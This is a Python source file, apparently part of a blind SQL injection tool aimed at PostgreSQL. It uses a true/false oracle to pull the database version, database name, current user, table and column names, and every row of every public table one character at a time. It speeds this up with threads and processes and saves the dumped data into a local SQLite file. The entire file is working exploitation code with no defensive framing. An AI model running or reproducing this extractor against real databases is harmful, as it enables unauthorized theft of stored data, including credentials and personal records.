import string, urllib3, sqlite3
from . import utils
from threading import Thread, Lock
from multiprocessing import Queue, Process, Manager
from rich.progress import Progress

urllib3.disable_warnings()

class PostgreSQL:
    def __init__(self, isTrue, outputPath, localDB) -> None:
        self.isTrue = isTrue
        self.extractData = localDB != None
        self.ldb = None if localDB is None else sqlite3.connect(localDB)
        self.dbLock = Lock()
        self.outputPath = outputPath
        self.outputText = ''
        self.dictionary = string.ascii_lowercase + string.digits + string.ascii_uppercase + ' ' + """!"#%()*+,-./:;<=>@[]^_`{|}~"""

    def output(self, txt):
        self.outputText += f'{txt}\n'
        with open(self.outputPath, 'w') as f:
            f.write(self.outputText)

    def extractLetterAtIndex(self, query, index, letters):
        for c in self.dictionary:
            if self.isTrue(query % c):
                letters.put((index, c))
                break

    def getString(self, query, len, parenthesisOffset=False):
        threads = []
        q = Queue()

        for i in range(len):
            t = Thread(target=self.extractLetterAtIndex, args = (query % ('%s', i+(2 if parenthesisOffset else 1)), i, q), daemon = True)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        pieces = []

        while q.qsize() > 0:
            pieces.append(q.get())

        pieces = sorted(pieces, key= lambda e: e[0])

        return ''.join([p[1] for p in pieces])

    def whatNumber(self, q):
        l = 0

        while True:
            if self.isTrue(q % l):
                break
            l += 1

        return l

    def executeLDBQueryRaw(self, q):
        with self.dbLock:
            cur = self.ldb.cursor()
            cur.execute(q)
            self.ldb.commit()

    def executeLDBQuery(self, q, params):
        with self.dbLock:
            cur = self.ldb.cursor()
            cur.execute(q, tuple(params))
            self.ldb.commit()

    def dumpTable(self, tName, pMap, tid):
        recordsNo = self.whatNumber(f"""%d = (SELECT COUNT(*) FROM {tName})""")

        pMap[tid] = { 't': recordsNo, 'p': 0 }

        columnsNo = self.whatNumber(f"""%d = ( SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name = '{tName}')""")

        columns = []

        for ci in range(columnsNo):
            colLen = self.whatNumber(f"""%d = (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name = '{tName}' ORDER BY column_name ASC OFFSET {ci} LIMIT 1)""")
            columns.append(self.getString(f"""'%s' = (SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = '{tName}' ORDER BY column_name ASC OFFSET {ci} LIMIT 1) FROM %d FOR 1))""", colLen))

        self.executeLDBQueryRaw(f""" CREATE TABLE IF NOT EXISTS {tName}({ ', '.join([ f'{c} TEXT' for c in columns]) })""")

        for ri in range(recordsNo):
            
            row = []
            
            for c in columns:
                fieldLen = self.whatNumber(f"""%d = (SELECT LENGTH(CAST({c} as TEXT)) FROM {tName} ORDER BY {columns[0]} ASC OFFSET {ri} LIMIT 1)""")
                field = self.getString(f"""'%s' = (SELECT SUBSTRING(( SELECT CAST({c} as TEXT) FROM {tName} ORDER BY {columns[0]} ASC OFFSET {ri} LIMIT 1 ) FROM %d FOR 1))""", fieldLen)
                row.append(field)

            pMap[tid] = { 't': recordsNo, 'p': ri + 1 }

            self.executeLDBQuery(f"""INSERT INTO {tName} VALUES ({ ', '.join(['?' for _ in range(columnsNo)]) })""", row)

    def run(self):
        utils.printDoing('Obtaining database version...')
        
        dbInfoLen =  self.whatNumber("""%d = ( SELECT LENGTH(version()) )""")
        
        dbInfo = self.getString("""'%s' = (SELECT SUBSTRING(version() FROM %d FOR 1))""", dbInfoLen)
        
        utils.printSuccess(f'DB Info: {dbInfo}')
        
        self.output(f'DB Info: {dbInfo}')

        utils.printDoing('Obtaining current database name...')

        dbNameLen = self.whatNumber("""%d = ( SELECT LENGTH(current_database()) )""")

        dbName = self.getString("""'%s' = (SELECT SUBSTRING(current_database() FROM %d FOR 1))""", dbNameLen)
        
        utils.printSuccess(f'DB Name: {dbName}')
        
        self.output(f'DB Name: {dbName}')

        utils.printDoing('Obtaining current username...')

        usernameLen = self.whatNumber("""%d = (SELECT LENGTH(user))""")

        username = self.getString("""'%s' = (SELECT SUBSTRING(user FROM %d FOR 1))""", usernameLen)

        utils.printSuccess(f'Current Username: {username}')
        
        self.output(f'Current Username: {username}')

        utils.printDoing('Extracting number of tables...')

        tablesN = self.whatNumber("""%d = ( SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' )""")

        utils.printSuccess(f'Number of tables in current DB: {tablesN}')
        
        self.output(f'Number of tables in current DB: {tablesN}')

        self.output('Table Names:')

        if self.extractData:
            tableProcesses = []
            
            print('')
            
            with Progress() as progress:
                tableNamesTask = progress.add_task("[green]Extracting table names...", total=tablesN)
                
                m = Manager()

                progress_map = m.dict()

                for tIndex in range(tablesN):

                    tNameLen = self.whatNumber(f"""%d = ( SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' ORDER BY table_name ASC OFFSET {tIndex} LIMIT 1 )""")

                    tName = self.getString(f"""'%s' = (SELECT SUBSTRING(CAST(t AS TEXT) FROM %d FOR 1) FROM (SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' ORDER BY table_name ASC OFFSET {tIndex} LIMIT 1) as t )""", tNameLen, parenthesisOffset=True)

                    self.output(tName)

                    progress.update(tableNamesTask, advance=1)
                    
                    task = progress.add_task(f"[cyan](T) {tName}", total=100)

                    progress_map[task] = {"p": 0, "t": 100}

                    proc = Process(target=self.dumpTable, args=(tName, progress_map, task))

                    proc.start()

                    tableProcesses.append(proc)

                while sum([p.is_alive() for p in tableProcesses]) != 0:
                    for task_id, update_data in progress_map.items():
                        latest = update_data["p"]
                        total = update_data["t"]
                        progress.update(
                            task_id,
                            completed=latest,
                            total=total
                        )
        else:

            utils.printDoing("Now extracting table names")

            for tIndex in range(tablesN):
                
                utils.printDoing(f'Extracting table N {tIndex+1}')

                tNameLen = self.whatNumber(f"""%d = ( SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' ORDER BY table_name ASC OFFSET {tIndex} LIMIT 1 )""")

                tName = self.getString(f"""'%s' = (SELECT SUBSTRING(CAST(t AS TEXT) FROM %d FOR 1) FROM (SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' ORDER BY table_name ASC OFFSET {tIndex} LIMIT 1) as t )""", tNameLen, parenthesisOffset=True)

                utils.printSuccess(f'Table N {tIndex+1} name: {tName}')
                self.output(tName)

